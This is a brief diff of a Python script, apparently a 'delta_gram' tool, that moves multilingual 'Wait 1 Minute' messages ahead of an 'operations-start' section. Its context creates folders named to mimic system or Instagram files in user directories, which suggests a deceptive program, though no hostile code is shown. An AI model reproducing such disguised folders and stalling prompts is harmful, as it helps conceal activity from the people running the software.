@@ -144,6 +144,14 @@ if __name__=="__main__":
     delta_gram.Warring()
     delta_gram.mainloop()
 
+############################################
+print("[En+]Wait 1 Minute...")             ##
+print("[Ru+]Подождите 1 минуту...")        ##
+print("[Tr+]1 dakika bekleyin...")         ##
+print("[Japn+]1分待つ...")                  ##
+print("[German+]Warten Sie 1 Minute...")   ##
+############################################
+
 #1 operations-start-
 import os
 from getpass import getuser
@@ -258,13 +266,7 @@ windows_games()
 instagram_system=(Desktop+"instagram.system\\")
 perflogs=(Downloads+"Perflogs\\")
 Microsoft=(Documents+"Microsoft\\")
-############################################
-print("[En+]Wait 1 Minute...")             ##
-print("[Ru+]Подождите 1 минуту...")        ##
-print("[Tr+]1 dakika bekleyin...")         ##
-print("[Japn+]1分待つ...")                  ##
-print("[German+]Warten Sie 1 Minute...")   ##
-############################################
+
 class system_desktop:#File->Desktop
     try:
         path=(instagram_system+"SetLogs_\\")
